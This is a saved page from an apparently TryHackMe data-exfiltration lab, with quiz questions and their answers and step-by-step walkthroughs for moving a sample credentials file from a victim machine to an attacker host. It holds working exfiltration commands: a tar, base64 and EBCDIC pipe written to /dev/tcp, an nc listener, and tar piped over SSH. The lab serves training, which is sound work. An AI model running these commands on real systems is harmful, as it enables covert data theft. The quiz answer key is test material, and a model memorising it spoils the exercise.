onclick="initPopOver(&#39;TCP&#39;, &#39;s1ceIwSP&#39;)">TCP</a> socket and Base64</span></li>
<li>Exfiltrate using SSH</li>
<li>Exfiltrate using HTTPS (POST request)</li>
<li>ICMP</li>
<li><span><a class="QblaxQst glossary-term" onclick="initPopOver(&#39;DNS&#39;, &#39;QblaxQst&#39;)">DNS</a></span></li><p></p></ul><ul>
</ul></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom hacker-green">
            <div>Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                In which case scenario will sending and receiving traffic continue during the connection?
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: *********" value="Tunneling" disabled="">
                            <input type="hidden" value="1">
                            <input type="hidden" value="3">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Correct Answer
                        </button>
                        </div>
                        
                    </div><div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                <p>In which case scenario will sending and receiving traffic be in one direction?<br></p>
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: *********** **** ************" value="traditional data exfiltration" disabled="">
                            <input type="hidden" value="2">
                            <input type="hidden" value="3">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Correct Answer
                        </button>
                        </div>
                        
                    </div><div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details"><span>
                                In the next task, we will be discussing how data exfiltration over the TCP socket works!
                            </span></div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="No answer needed" value="" disabled="">
                            <input type="hidden" value="3">
                            <input type="hidden" value="3">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Question Done
                        </button>
                        </div>
                        
                    </div>
                        </div>
                    </div>
                </div><div class="card" id="task-4">
                    <div class="card-header task-header" data-toggle="collapse" href="#collapse4">
                        <a class="card-link">
                            <span class="task-dropdown-title hacker-green">Task 4                             <span class="task-dropdown-icon"><i class="fas fa-check-circle"></i></span></span> Exfiltration using TCP socket
                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
                            <span class="task-resources"></span>
                        </a>
                    </div>
                    <div id="collapse4" class="collapse " data-parent="#taskContent">
                        <div class="card-body task-complete">
                            <div class="room-task-desc">
            <div class="room-task-desc-data"> <p><span>This task shows how to exfiltrate data over <a class="pd31JxPi glossary-term" onclick="initPopOver(&#39;TCP&#39;, &#39;pd31JxPi&#39;)">TCP</a> using data encoding.&nbsp;</span><span style="font-size:1rem"><span>Using the <a class="zTjdLNUl glossary-term" onclick="initPopOver(&#39;TCP&#39;, &#39;zTjdLNUl&#39;)">TCP</a> socket is one of the data exfiltration techniques that an attacker may use in</span></span><span style="font-size:1rem">&nbsp;a non-secured environment where they know there are no network-based security products.&nbsp;</span><span style="font-size:1rem">If we are in a well-secured environment, then this kind of exfiltration is not recommended.&nbsp;</span><span style="font-size:1rem">This exfiltration type is easy to detect because we rely on non-standard protocols.</span></p><p><span>Besides the <a class="WDv87Auj glossary-term" onclick="initPopOver(&#39;TCP&#39;, &#39;WDv87Auj&#39;)">TCP</a> socket, we will also use various other techniques, including data encoding and archiving. One of the benefits of this technique is that it encodes the data during transmission and makes it harder to examine.</span></p><p><span>The following diagram explains how traditional communications over <a class="oGXLpukd glossary-term" onclick="initPopOver(&#39;TCP&#39;, &#39;oGXLpukd&#39;)">TCP</a> work. If two machines want to communicate, then one of them has to listen and wait for the incoming traffic. It is similar to how two people talk and communicate, where one of them is listening, and the other person is speaking.&nbsp;</span></p><p style="text-align:center"><img src="./TryHackMe _ Data Exfiltration_files/9931b598f5757bbdfb74004a2a43fe16.png" alt="Connection over TCP/port"><br></p><p><span>The diagram shows that two hosts communicate over <a class="nIqFnHSf glossary-term" onclick="initPopOver(&#39;TCP&#39;, &#39;nIqFnHSf&#39;)">TCP</a> on port 1337 in the following steps:</span></p><ol><li><span>The first machine is listening over <a class="gdS9MLto glossary-term" onclick="initPopOver(&#39;TCP&#39;, &#39;gdS9MLto&#39;)">TCP</a> on port </span><b>1337</b></li><li>The other machine connects to the port specified in step 1. For example,&nbsp;<b>nc 1.2.3.4 1337</b></li><li>The first machine establishes the connection</li><li>Finally, the sending and receiving data starts. For example, the attacker sends commands and receives results.</li></ol><p><span>Communication over <a class="105Wxo6s glossary-term" onclick="initPopOver(&#39;TCP&#39;, &#39;105Wxo6s&#39;)">TCP</a> requires two machines, one victim and one attacker machine, to transfer data. Let's use our network environment to practice sending data over TCP. To establish communication over TCP, we require two machines: the&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">victim1.thm.com</span><span style="font-size:1rem">&nbsp;machine is the victim&nbsp;</span>and the JumpBox,&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">jump.thm.com</span><span style="font-size:1rem">,&nbsp;</span><span style="font-size:1rem">is the attacker's machine.</span></p>

<p>First, we need to prepare a listener on the&nbsp;<b>JumpBox</b> on a port you specify. In our case, we choose&nbsp;<span style="font-size:1rem">port&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">8080</span><span style="font-size:1rem">.</span><br></p>
<p></p><div class="terminal-container"><div class="terminal-content"><div class="terminal-top">Listening on port TCP/8080 in the JumpBox<br></div><pre class="terminal-code language-markup" style="font-size:14px" tabindex="0">           
			<code class=" language-markup">thm@jump-box$ nc -lvp 8080 &gt; /tmp/task4-creds.data
Listening on [0.0.0.0] (family 0, port 8080)
</code>
	    </pre></div></div><p></p>
<p>From the previous command, we used the&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">nc</span><span style="font-size:1rem">&nbsp;</span>command to receive data on port&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">8080</span>. Then, once we receive the data, we store it in the&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">/tmp/</span><span style="font-size:1rem">&nbsp;</span>directory and call it&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">task4-creds.data</span><span style="font-size:1rem">&nbsp;as a filename.</span></p>

<p>Now let's connect to our victim machine that contains the data that needs to be transmitted using the following credential:&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">thm:tryhackme</span><span style="font-size:1rem">. Note that </span><span style="font-size:1rem">to connect to the&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">victim1</span><span style="font-size:1rem">&nbsp;from the JumpBox, we can use the internal domain name as follows,</span></p>

<p></p><div class="terminal-container"><div class="terminal-content"><div class="terminal-top">Connect to the victim from the JumpBox<br></div><pre class="terminal-code language-markup" style="font-size:14px" tabindex="0">           
			<code class=" language-markup">thm@jump-box$ ssh thm@victim1.thm.com</code>
	    </pre></div></div><p></p>

<p>We can also connect directly from the AttackBox using port&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">2022</span><span style="font-size:1rem">&nbsp;</span>as follows,</p>

<p></p><div class="terminal-container"><div class="terminal-content"><div class="terminal-top">Connect to the victim from the AttackBox<br></div><pre class="terminal-code language-markup" style="font-size:14px" tabindex="0">           
			<code class=" language-markup">root@AttackBox$ ssh thm@MACHINE_IP -p 2022</code>
	    </pre></div></div><p></p>

<p>We have the required data ready to be transmitted on the victim machine. In this case, we have a sample file with a couple of credentials.</p><p></p>
<div class="terminal-container">
    <div class="terminal-content">
        <div class="terminal-top">Checking the creds.txt file on the victim machine<br></div>
        <pre class="terminal-code language-markup" style="font-size:14px" tabindex="0">           
			<code class=" language-markup">thm@victim1:~$ cat task4/creds.txt
admin:password
Admin:123456
root:toor</code>
	    </pre></div></div><p></p>
<p><span>Now that we have the credential text file, we will use the <a class="OKPoRjgW glossary-term" onclick="initPopOver(&#39;TCP&#39;, &#39;OKPoRjgW&#39;)">TCP</a> socket to exfiltrate it. </span><b>Make sure the listener is running on the JumpBox</b>.</p>
<p></p><div class="terminal-container"><div class="terminal-content"><div class="terminal-top"><span>Exfiltrate Data over <a class="HnJgCjP9 glossary-term" onclick="initPopOver(&#39;TCP&#39;, &#39;HnJgCjP9&#39;)">TCP</a> Socket from the victim machine!</span><br></div><pre class="terminal-code language-markup" style="font-size:14px" tabindex="0">           
			<code class=" language-markup">thm@victim1:$ tar zcf - task4/ | base64 | dd conv=ebcdic &gt; /dev/tcp/192.168.0.133/8080
0+1 records in
0+1 records out
260 bytes copied, 9.8717e-05 s, 2.6 MB/s</code>
	    </pre></div></div><p></p>
<p>Let's break down the previous command&nbsp;<span style="font-size:1rem">and explain it</span><span style="font-size:1rem">:</span></p>

<ol><li>We used the&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">tar</span><span style="font-size:1rem">&nbsp;</span>command to create an archive file with the&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">zcf</span><span style="font-size:1rem">&nbsp;</span>arguments of the content of the secret directory.</li><li>The&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">z</span><span style="font-size:1rem">&nbsp;is&nbsp;</span>for using gzip to compress the selected folder, the&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">c</span>&nbsp;is for creating a new archive, and the&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">f</span><span style="font-size:1rem">&nbsp;</span>is for&nbsp;using an archive file.</li><li>We then passed the created tar file to the base64 command for converting it to base64 representation.</li><li>Then, we passed the result of the base64 command to create and copy a backup file with the&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">dd</span>&nbsp;command using EBCDIC encoding data.</li><li>Finally, we redirect the&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">dd</span><span>&nbsp;command's output to transfer it using the <a class="PoN4ut9b glossary-term" onclick="initPopOver(&#39;TCP&#39;, &#39;PoN4ut9b&#39;)">TCP</a> socket on the specified IP and port, which in this case, port&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">8080</span>.</li></ol>
<p>Note that we used the Base64 and EBCDIC encoding to protect the data during the exfiltration. If someone inspects the traffic, it would be in a non-human readable format and wouldn't reveal the transmitted file type. </p><p>Once we hit enter, we should receive the encoded data in the&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">/tmp/</span><span style="font-size:1rem;text-align:center">&nbsp;</span>directory.</p>
<p></p><div class="terminal-container"><div class="terminal-content"><div class="terminal-top">Checking the received data on the JumpBox&nbsp;<br></div><pre class="terminal-code language-markup" style="font-size:14px" tabindex="0">           
			<code class=" language-markup">thm@jump-box$ nc -lvp 8080 &gt; /tmp/task4-creds.data
Listening on [0.0.0.0] (family 0, port 8080)
Connection from 192.168.0.101 received!

thm@jump-box$ ls -l /tmp/
-rw-r--r-- 1 root root       240 Apr  8 11:37 task4-creds.data</code>
	    </pre></div></div><p></p>
<p>On the JumpBox, we need to convert the received data back to its original status. We will be using the&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">dd</span><span style="font-size:1rem">&nbsp;tool to convert it back.&nbsp;</span></p>
<p></p><div class="terminal-container"><div class="terminal-content"><div class="terminal-top">Restoring the tar file<br></div><pre class="terminal-code language-markup" style="font-size:14px" tabindex="0">           
			<code class=" language-markup">thm@jump-box$ cd /tmp/
thm@jump-box:/tmp/$ dd conv=ascii if=task4-creds.data |base64 -d &gt; task4-creds.tar
0+1 records in
0+1 records out
260 bytes transferred in 0.000321 secs (810192 bytes/sec)</code>
	    </pre></div></div><p></p>
<p>The following is the explanation of the previous command:</p><ol><li>We used the&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">dd</span>&nbsp;command to convert the received file to&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">ASCII</span>&nbsp;&nbsp;representation. We used the <span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">task4-creds.data</span>&nbsp;as input to the&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">dd</span>&nbsp;command.&nbsp;</li><li>The output of the&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">dd</span>&nbsp;command will be passed to the base64 to decode it using the&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">-d</span>&nbsp;argument.</li><li>Finally, we save the output in the&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">task4-creds.tar</span>&nbsp;&nbsp;file.</li></ol>
<p>Next, we need to use the&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">tar</span>&nbsp;command to unarchive the&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">task4-creds.tar</span>&nbsp;file and check the content as follows,</p>
<p></p><div class="terminal-container"><div class="terminal-content"><div class="terminal-top">Uncompressing the tar file<br></div><pre class="terminal-code language-markup" style="font-size:14px" tabindex="0">           
			<code class=" language-markup">thm@jump-box$ tar xvf task4-creds.tar
task4/ 
task4/creds.txt</code>
	    </pre></div></div><p></p>
<p>Let's break down the previous command&nbsp;<span style="font-size:1rem">and explain it</span><span style="font-size:1rem">:</span></p><ol><li>We used the&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">tar</span><span style="font-size:1rem">&nbsp;</span>command to unarchive the file with the&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">xvf</span><span style="font-size:1rem">&nbsp;</span>arguments.</li><li>The&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">x</span><span style="font-size:1rem">&nbsp;is&nbsp;</span>for extracting the tar file, the&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">v</span>&nbsp;for verbosely listing files, and the&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">f</span><span style="font-size:1rem">&nbsp;</span>is for&nbsp;using an archive file.</li></ol><p>Now let's confirm that we have the same data from the victim machine.</p>
<p></p><div class="terminal-container"><div class="terminal-content"><div class="terminal-top">Confirming the received data<br></div><pre class="terminal-code language-markup" style="font-size:14px" tabindex="0">           
			<code class=" language-markup">thm@jump-box$ cat task4/creds.txt
admin:password
Admin:123456
root:toor</code>
	    </pre></div></div><p></p>
<p><span>Success! We exfiltrated data from a victim machine to an attacker machine using the <a class="7Ca3ImAY glossary-term" onclick="initPopOver(&#39;TCP&#39;, &#39;7Ca3ImAY&#39;)">TCP</a> socket in this task.</span></p></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom hacker-green">
            <div>Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                <p><span>Exfiltration using <a class="d1zk77wv glossary-term" onclick="initPopOver(&#39;TCP&#39;, &#39;d1zk77wv&#39;)">TCP</a> sockets relies on ____________ protocols!&nbsp;</span></p>
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: ************" value="non-standard" disabled="">
                            <input type="hidden" value="1">
                            <input type="hidden" value="4">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Correct Answer
                        </button>
                        </div>
                        
                    </div><div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details"><span>
                                Now apply what we discussed to exfiltrate data over the TCP socket! Once you exfiltrate data successfully, hit </span><b>Completed</b> to move on to the next task!
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="No answer needed" value="" disabled="">
                            <input type="hidden" value="2">
                            <input type="hidden" value="4">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Question Done
                        </button>
                        </div>
                        
                    </div>
                        </div>
                    </div>
                </div><div class="card" id="task-5">
                    <div class="card-header task-header" data-toggle="collapse" href="#collapse5">
                        <a class="card-link">
                            <span class="task-dropdown-title hacker-green">Task 5                             <span class="task-dropdown-icon"><i class="fas fa-check-circle"></i></span></span> Exfiltration using SSH
                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
                            <span class="task-resources"></span>
                        </a>
                    </div>
                    <div id="collapse5" class="collapse " data-parent="#taskContent">
                        <div class="card-body task-complete">
                            <div class="room-task-desc">
            <div class="room-task-desc-data"> <p>In this task we will show&nbsp;<span style="font-size:1rem">how to use SSH protocol to exfiltrate data over to an attacking machine. SSH protocol establishes a secure channel to interact and move data between the client and server, so all transmission data is encrypted over the network or the Internet.</span></p><p style="text-align:center"><img src="./TryHackMe _ Data Exfiltration_files/aa723bb0e2c39dfc936b135c4912d1cf.png" alt="Encrypted SSH communication channel"><br></p><p>To transfer data over the SSH, we can use either the Secure Copy Protocol&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">SCP</span>&nbsp;or the SSH client. Let's assume that we don't have the&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">SCP</span>&nbsp;command available to transfer data over SSH. Thus, we will focus more on the SSH client in this task.<br></p><p>As we mentioned earlier, an attacker needs to control a server, which in this case has an SSH server enabled, to receive the exfiltrated data. Thus, we will be using the AttackBox as our SSH server in this scenario. You can also use the JumpBox since it has an SSH server enabled.<br></p><p>Let's assume that we have gained access to sensitive data that must be transmitted securely. &nbsp;Let's connect to the&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">victim1</span>&nbsp;or&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">victim2</span>&nbsp;machine.</p>
<p></p><div class="terminal-container"><div class="terminal-content"><div class="terminal-top">The data that needs to be transferred<br></div><pre class="terminal-code language-markup" style="font-size:14px" tabindex="0">           
			<code class=" language-markup">thm@victim1:~$ cat task5/creds.txt
admin:password
Admin:123456
root:toor</code>
	    </pre></div></div><p></p>
<p><span>Let's use the same technique we discussed in the "exfiltration using a <a class="ATGG7s3l glossary-term" onclick="initPopOver(&#39;TCP&#39;, &#39;ATGG7s3l&#39;)">TCP</a> socket" task, where we will be using the tar command to archive the data and then transfer it.</span></p>
<p></p><div class="terminal-container"><div class="terminal-content"><div class="terminal-top">Exfiltration data from the victim1 machine<br></div><pre class="terminal-code language-markup" style="font-size:14px" tabindex="0">           
			<code class=" language-markup">thm@victim1:$ tar cf - task5/ | ssh thm@jump.thm.com "cd /tmp/; tar xpf -"</code>
	    </pre></div></div><p></p>
<p><span style="font-size:1rem">Let's break down the previous command&nbsp;</span><span style="font-size:1rem">and explain it</span>:<br></p><ol><li>We used the&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">tar</span>&nbsp;command the same as the previous task to create an archive file of the&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">task5</span>&nbsp;directory.</li><li>Then we passed the archived file over the ssh. SSH clients provide a way to execute a single command without having a full session. </li><li>We passed the command that must be executed in double quotations,&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">"cd /tmp/; tar xpf</span>. In this case, we change the directory and unarchive the passed file.</li></ol><p>If we check the attacker machine, we can see that we have successfully transmitted the file.</p>
<p></p><div class="terminal-container"><div class="terminal-content"><div class="terminal-top">Checking the received data<br></div><pre class="terminal-code language-markup" style="font-size:14px" tabindex="0">           
			<code class=" language-markup">thm@jump-box$ cd /tmp/task5/
thm@jump-box:/tmp/task5$ cat creds.txt
admin:password
Admin:123456
root:toor</code>	    </pre></div></div><p></p></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom hacker-green">
            <div>Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                <p>All packets sent using the Data Exfiltration technique over SSH are encrypted! (T=True/F=False)<br></p>
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: *" value="T" disabled="">
                            <input type="hidden" value="1">
